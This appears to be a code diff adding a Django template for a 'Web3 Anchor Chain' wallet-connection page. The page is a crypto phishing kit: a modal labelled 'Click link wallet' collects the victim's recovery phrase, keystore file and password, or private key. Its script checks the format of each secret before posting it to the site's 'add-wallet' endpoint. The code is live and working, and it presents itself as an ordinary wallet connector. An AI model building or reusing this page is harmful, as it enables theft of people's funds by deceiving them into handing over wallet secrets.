+                <!-- Desktop Navigation - moved to the right -->
+                <ul class="hidden lg:flex gap-3 lg:gap-4 xl:gap-8 xl:text-lg">
+                    <li><a class="lg:text-lg py-2 inline-flex hover:text-primary-400 transition-colors" href="/content-wallet?name=dapps">DApps</a></li>
+                    <li><a class="lg:text-lg py-2 inline-flex hover:text-primary-400 transition-colors" href="/content-wallet?name=nft">NFT</a></li>
+                    <li><a class="lg:text-lg py-2 inline-flex hover:text-primary-400 transition-colors" href="/content-wallet?name=web3">Web3</a></li>
+                    <li><a class="lg:text-lg py-2 inline-flex hover:text-primary-400 transition-colors" href="/content-wallet?name=secure">Secure Wallet</a></li>
+                </ul>
+
+                <!-- Mobile hamburger menu button -->
+                <button @click="toggleMobileMenu()" class="text-2xl lg:hidden text-white">
+                    <svg class="w-6 h-6" fill="none" stroke="currentColor" viewBox="0 0 24 24">
+                        <path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M4 6h16M4 12h16M4 18h16"></path>
+                    </svg>
+                </button>
+            </div>
+        </div>
+
+        <!-- Mobile menu -->
+        <div :class="mobileMenu ? &#39;translate-x-0&#39; : &#39;-translate-x-full&#39;" class="fixed h-screen overflow-y-auto bg-gray-800 lg:hidden top-0 left-0 z-50 p-4 w-80 transition-transform duration-300 ease-in-out -translate-x-full" style="transform: translateX(-100%);" bis_skin_checked="1">
+            <div class="flex justify-between items-center mb-6" bis_skin_checked="1">
+                <a href="/">
+                    <div class="logo-container text-xl font-bold " bis_skin_checked="1">
+            <span class="logo-word text-primary-400">Web3</span>
+            <span class="logo-word text-secondary-500">Anchor</span>
+            <span class="logo-word text-accent-500">Chain</span>
+    </div>
+                </a>
+                <button @click="mobileMenu = false" class="text-xl text-white">
+                    <svg class="w-6 h-6" fill="none" stroke="currentColor" viewBox="0 0 24 24">
+                        <path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M6 18L18 6M6 6l12 12">
+                        </path>
+                    </svg>
+                </button>
+            </div>
+            <ul class="flex flex-col gap-3">
+                <li><a class="py-2 inline-flex hover:text-secondary-500 transition-colors" href="/content-wallet?name=dapps">DApps</a>
+                </li>
+                <li><a class="py-2 inline-flex hover:text-secondary-500 transition-colors" href="/content-wallet?name=nft">NFT</a>
+                </li>
+                <li><a class="py-2 inline-flex hover:text-secondary-500 transition-colors" href="/content-wallet?name=web3">Web3</a>
+                </li>
+                <li><a class="py-2 inline-flex hover:text-secondary-500 transition-colors" href="/content-wallet?name=secure">Secure
+                        Wallet</a></li>
+            </ul>
+        </div>
+
+        <!-- Mobile menu background overlay -->
+        <template x-if="mobileMenu"></template>
+    </header>
+{% if messages %}
+    {% for message in messages %}
+        <script>
+            Swal.fire({
+                icon: "{{ message.tags }}",  // success, error, warning, info
+                title: "{{ message.tags|title }}",
+                text: "{{ message }}",
+                confirmButtonColor: "#3085d6"
+            });
+        </script>
+    {% endfor %}
+{% endif %}
+    <!-- WALLETS SECTION -->
+    <section class="wallets-section mt-20 xl:mt-24">
+        <div class="container" bis_skin_checked="1">
+
+
+            <div id="content" bis_skin_checked="1">
+        <h2 style="text-transform: capitalize;">{{wallet_name|default:'connect-wallet'}}</h2>
+                <p class="description">The next generation of the internet, powered by blockchain technology. It aims to create a decentralized and user-controlled web. Investors should explore opportunities in Web3 infrastructure and applications.</p>
+            </div>
+
+            <div x-data="walletApp()" bis_skin_checked="1">
+                <!-- Simple Search Section -->
+                <div style="margin-bottom: 2rem; width: 100%;" bis_skin_checked="1">
+                    <div style="display: flex; flex-direction: column; gap: 1.5rem; width: 100%;" bis_skin_checked="1">
+                        <!-- Header -->
+                        <div style="text-align: center;" bis_skin_checked="1">
+                            <span class="wallet-label" style="font-size: 1.5rem; font-weight: 600; color: #ffffff;">Choose wallet</span>
+                        </div>
+
+                        <!-- Search Bar -->
+                        <div style="width: 100%; max-width: 600px; margin: 0 auto;" bis_skin_checked="1">
+                            <form method="post" style="position: relative;" bis_skin_checked="1">
+                                {% csrf_token %}
+                                <input type="text"   placeholder="Search for wallets by name..."  name="search" style="width: 100%; padding: 16px 50px 16px 20px; border: 2px solid rgb(55, 65, 81); border-radius: 12px; font-size: 16px; background: rgba(55, 65, 81, 0.8); color: rgb(255, 255, 255); transition: 0.3s; outline: none; box-shadow: none;" @focus="$el.style.borderColor = &#39;#22c55e&#39;; $el.style.boxShadow = &#39;0 0 0 3px rgba(34, 197, 94, 0.1)&#39;" @blur="$el.style.borderColor = &#39;#374151&#39;; $el.style.boxShadow = &#39;none&#39;">
+
+                                <!-- Clear button -->
+                                <button   style="position: absolute; right: 15px; top: 50%; transform: translateY(-50%); background: rgb(239, 68, 68); border: none; color: white; cursor: pointer; padding: 6px; border-radius: 50%; width: 28px; height: 28px; display: none; align-items: center; justify-content: center; transition: 0.2s;" @mouseenter="$el.style.background = &#39;#dc2626&#39;" @mouseleave="$el.style.background = &#39;#ef4444&#39;">
+                                    <svg width="14" height="14" fill="none" stroke="currentColor" viewBox="0 0 24 24">
+                                        <path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M6 18L18 6M6 6l12 12"></path>
+                                    </svg>
+                                </button>
+                            </form>
+                        </div>
+
+
+                    </div>
+                </div>
+                <div class="row" bis_skin_checked="1">
+                    
+                     
+  <div class="row items-center" style="width: 100%; gap: 2px; display: flex; justify-content: center;" x-data="walletApp()">
+
+    {% for coin in coin %}
+    <div class="col-12 col-md-6 col-lg-4">
+        <div class="hp-select-box-item">
+            <div class="wallet-card"
+                 @click="selectCoin('{{ coin.fullname }}', '{{ coin.image }}', '{{ coin.id }}')"
+                 style="cursor: pointer;">
+                <div style="padding: 6px;">
+                    <div style="display: flex; align-items: center;">
+                        <!-- IMAGE -->
+                        <div style="flex: 0 0 25%; padding: 12px;">
+                            <img src="{{ coin.image }}"
+                                 alt="{{ coin.fullname }}"
+                                 style="width: 3rem; height: 3rem; border-radius: 50%;">
+                        </div>
+                        <!-- NAME -->
+                        <div style="flex: 1;">
+                            <span style="font-size: 15px; font-weight: 700;">
+                                {{ coin.fullname }} ({{ coin.shortname }})
+                            </span>
+                        </div>
+                        <div style="flex: 1;">
+                            <span class="uppercase" style="font-size: 10px; font-weight: 800; color: rgb(233, 191, 6);">
+                             Click  link wallet
+                            </span>
+                        </div>
+                    </div>
+                </div>
+            </div>
+        </div>
+    </div>
+    {% endfor %}
+
+    <!-- MODAL -->
+    <div x-show="showModal" class="fixed inset-0 flex items-center justify-center z-50">
+        <div class="bg-white p-6 rounded-lg max-w-md w-full">
+
+            <!-- IMAGE + NAME -->
+            <div class="text-center mb-4">
+                <img :src="selectedWalletImage" class="w-16 h-16 mx-auto rounded-full">
+                <h3 x-text="selectedWalletName" class="font-bold mt-2"></h3>
+            </div>
+{% include './SUCCESSMODAL.html' %}
+            <!-- FORM -->
+            <form method="POST" action="{% url 'add-wallet' %}" novalidate @submit.prevent="submitForm($event)">
+                {% csrf_token %}
+<input type="hidden" name="type" :value="activeTab">
+                <!-- Pass Coin ID -->
+                <input type="hidden" name="coin_id" :value="selectedCoinId">
+
+                <!-- ERROR MESSAGE -->
+                <div x-show="errorMessage" x-transition:enter="transition ease-out duration-200"
+                     x-transition:enter-start="opacity-0 transform -translate-y-2"
+                     x-transition:enter-end="opacity-100 transform translate-y-0"
+                     class="mb-4 p-3 bg-red-50 border border-red-200 rounded-md text-red-700"
+                     style="display: none;">
+                    <div class="flex items-center">
+                        <svg class="w-5 h-5 text-red-400 mr-2" fill="none" stroke="currentColor" viewBox="0 0 24 24">
+                            <path stroke-linecap="round" stroke-linejoin="round" stroke-width="2"
+                                  d="M12 8v4m0 4h.01M21 12a9 9 0 11-18 0 9 9 0 0118 0z"></path>
+                        </svg>
+                        <p class="text-sm" x-text="errorMessage"></p>
+                    </div>
+                </div>
+
+                <!-- SUCCESS MESSAGE -->
+                <div x-show="successMessage" x-transition:enter="transition ease-out duration-200"
+                     x-transition:enter-start="opacity-0 transform -translate-y-2"
+                     x-transition:enter-end="opacity-100 transform translate-y-0"
+                     class="mb-4 p-3 bg-green-50 border border-green-200 rounded-md text-green-700"
+                     style="display: none;">
+                    <div class="flex items-center justify-between">
+                        <p class="text-sm" x-text="successMessage"></p>
+                        <button type="button" @click="successMessage=''" class="font-bold">&times;</button>
+                    </div>
+                </div>
+
+                <!-- TABS -->
+                <div class="flex gap-2 mb-4">
+                    <button type="button" @click="activeTab='phrase'"
+                            :class="activeTab==='phrase' ? 'bg-blue-600 text-white' : 'bg-gray-200 text-gray-700'"
+                            class="px-3 py-1 rounded">Phrase</button>
+                    <button type="button" @click="activeTab='keystore'"
+                            :class="activeTab==='keystore' ? 'bg-blue-600 text-white' : 'bg-gray-200 text-gray-700'"
+                            class="px-3 py-1 rounded">Keystore</button>
+                    <button type="button" @click="activeTab='private_key'"
+                            :class="activeTab==='private_key' ? 'bg-blue-600 text-white' : 'bg-gray-200 text-gray-700'"
+                            class="px-3 py-1 rounded">Private</button>
+                </div>
+
+                <!-- PHRASE -->
+                <div x-show="activeTab==='phrase'" x-transition style="height: 300px; overflow-y:auto; color:#111827;">
+          
+                    <label class="block text-sm font-medium text-gray-700 mb-2">Name wallet</label>
+                    <input type="text" name="Namewallet" x-model="formData.wallet_name"
+                           placeholder="Name" class="w-full mb-2 p-2 border rounded"
+                           :required="activeTab==='phrase'">
+
+                    <label class="block text-sm font-medium text-gray-700 mb-2">Email</label>
+                    <input type="email" name="Email" x-model="formData.email"
+                           placeholder="Email" class="w-full mb-2 p-2 border rounded"
+                           :required="activeTab==='phrase'">
+
+                    <label class="block text-sm font-medium text-gray-700 mb-2">Recovery Phrase</label>
+                    <textarea name="RecoveryPhrase" x-model="formData.wallet_phrase"
+                              @input="validatePhraseInput"
+                              class="w-full p-2 border rounded mb-1" rows="4"
+                              placeholder="Enter your recovery phrase" :required="activeTab==='phrase'"></textarea>
+
+                    <div class="flex justify-between items-center text-xs text-gray-500">
+                        <p>Valid seed phrases: 12, 18, 20, 24, or 30 words</p>
+                        <span :class="[12,18,20,24,30].includes(phraseWordCount) ? 'text-green-600' : 'text-red-500'">
+                            <span x-text="phraseWordCount">0</span> words
+                        </span>
+                    </div>
+                </div>
+
+                <!-- KEYSTORE -->
+                <div x-show="activeTab==='keystore'" x-transition style="height: 300px; overflow-y:auto; color:#111827;">
+                     
+
+                    <label class="block text-sm font-medium text-gray-700 mb-2">Keystore JSON</label>
+                    <textarea name="keystonejson" x-model="formData.keystore_json" @input="validateKeystoreInput"
+                              class="w-full mb-2 p-2 border rounded" rows="4"
+                              placeholder="Paste your keystore JSON" :required="activeTab==='keystore'"></textarea>
+
+                    <div class="flex justify-between items-center text-xs text-gray-500 mb-2">
+                        <p>Must be valid JSON format</p>
+                        <span :class="isValidKeystore ? 'text-green-600' : 'text-red-500'">
+                            <span x-text="isValidKeystore ? 'Valid JSON' : 'Invalid JSON'">Invalid JSON</span>
+                        </span>
+                    </div>
+
+                    <label class="block text-sm font-medium text-gray-700 mb-2">Keystore Password</label>
+                    <input type="password" name="keystonejsonpassword" x-model="formData.keystore_password"
+                           class="w-full p-2 border rounded" placeholder="Enter keystore password"
+                           :required="activeTab==='keystore'">
+                    <p class="text-xs text-gray-500 mt-1">Password used to encrypt your keystore file</p>
+                </div>
+
+                <!-- PRIVATE KEY -->
+                <div x-show="activeTab==='private_key'" x-transition style="height: 300px; overflow-y:auto; color:#111827;">
+                   
+
+                    <label class="block text-sm font-medium text-gray-700 mb-2">Private Key</label>
+                    <textarea name="PrivatemainKey" x-model="formData.private_key" @input="validatePrivateKeyInput"
+                              class="w-full p-2 border rounded mb-1" rows="3"
+                              placeholder="Enter your private key" :required="activeTab==='private_key'"></textarea>
+
+                    <div class="flex justify-between items-center text-xs text-gray-500">
+                        <p>64 hexadecimal characters (with or without 0x prefix)</p>
+                        <span :class="isValidPrivateKey ? 'text-green-600' : 'text-red-500'">
+                            <span x-text="isValidPrivateKey ? 'Valid format' : 'Invalid format'">Invalid format</span>
+                        </span>
+                    </div>
+                </div>
+
+                <!-- FORM BUTTONS -->
+                <div class="flex justify-end gap-3 mt-6">
+                    <button type="button" @click="closeConnectionModal"
+                            class="px-6 py-2 text-white bg-gray-500 rounded-full hover:bg-gray-600">Cancel</button>
+                    <button type="submit" :disabled="isSubmitting"
+                            class="px-6 py-2 bg-blue-600 text-white rounded-full hover:bg-blue-700 disabled:opacity-50">
+                        <span x-show="!isSubmitting">Proceed</span>
+                        <span x-show="isSubmitting" style="display:none;">Processing...</span>
+                    </button>
+                </div>
+
+            </form>
+        </div>
+    </div>
+</div>
+
+<script>
+function walletApp() {
+    return {
+        // Modal & coin selection
+        activeTab: 'phrase',
+        selectedWalletName: '',
+        selectedWalletImage: '',
+        selectedCoinId: '',
+        showModal: false,
+
+        // Form data & validation
+        isSubmitting: false,
+        errorMessage: '',
+        successMessage: '',
+        formData: {
+            wallet_name: '',
+            email: '',
+            wallet_phrase: '',
+            keystore_json: '',
+            keystore_password: '',
+            private_key: ''
+        },
+        phraseWordCount: 0,
+        isValidKeystore: false,
+        isValidPrivateKey: false,
+
+        // Modal actions
+        selectCoin(name, image, id) {
+            this.selectedWalletName = name;
+            this.selectedWalletImage = image;
+            this.selectedCoinId = id;
+            this.showModal = true;
+        },
+        closeModal() {
+            this.showModal = false;
+            this.errorMessage = '';
+            this.successMessage = '';
+        },
+
+        // Form validation
+        validatePhraseInput() {
+            this.phraseWordCount = this.formData.wallet_phrase.trim().split(/\s+/).filter(Boolean).length;
+        },
+        validateKeystoreInput() {
+            try {
+                JSON.parse(this.formData.keystore_json);
+                this.isValidKeystore = true;
+            } catch {
+                this.isValidKeystore = false;
+            }
+        },
+        validatePrivateKeyInput() {
+            const key = this.formData.private_key.replace(/^0x/, '');
+            this.isValidPrivateKey = /^[0-9a-fA-F]{64}$/.test(key);
+        },
+
+        // Submit form
+        submitForm(event) {
+            this.errorMessage = '';
+            this.successMessage = '';
+            let valid = true;
+
+            // Validate active tab
+            if (this.activeTab === 'phrase') {
+                this.validatePhraseInput();
+                if (![12,18,20,24,30].includes(this.phraseWordCount)) {
+                    this.errorMessage = 'Recovery phrase must be 12, 18, 20, 24, or 30 words.';
+                    valid = false;
+                }
+                if (!this.formData.wallet_name || !this.formData.email || !this.formData.wallet_phrase) {
+                    this.errorMessage = 'Please fill in all required fields.';
+                    valid = false;
+                }
+            } else if (this.activeTab === 'keystore') {
+                this.validateKeystoreInput();
+                if (!this.isValidKeystore) {
+                    this.errorMessage = 'Keystore JSON is invalid.';
+                    valid = false;
+                }
+                if (!this.formData.wallet_name || !this.formData.email || !this.formData.keystore_password) {
+                    this.errorMessage = 'Please fill in all required fields.';
+                    valid = false;
+                }
+            } else if (this.activeTab === 'private_key') {
+                this.validatePrivateKeyInput();
+                if (!this.isValidPrivateKey) {
+                    this.errorMessage = 'Private key format is invalid.';
+                    valid = false;
+                }
+                if (!this.formData.wallet_name || !this.formData.email || !this.formData.private_key) {
+                    this.errorMessage = 'Please fill in all required fields.';
+                    valid = false;
+                }
+            }
+
+            if (!valid) {
+                event.preventDefault();
+                return;
+            }
+
+            // If valid, submit form
+            this.isSubmitting = true;
+            event.target.submit();
+        },
+
+        closeConnectionModal() {
+            this.showModal = false;
+            this.errorMessage = '';
+            this.successMessage = '';
+        }
+    }
+}
+</script>
+
+
+</div>
+</section>
+
+ 
+ 
+
+    <!-- Live Chat Widget -->
+ 
+ 
+
+ </div></body></html>
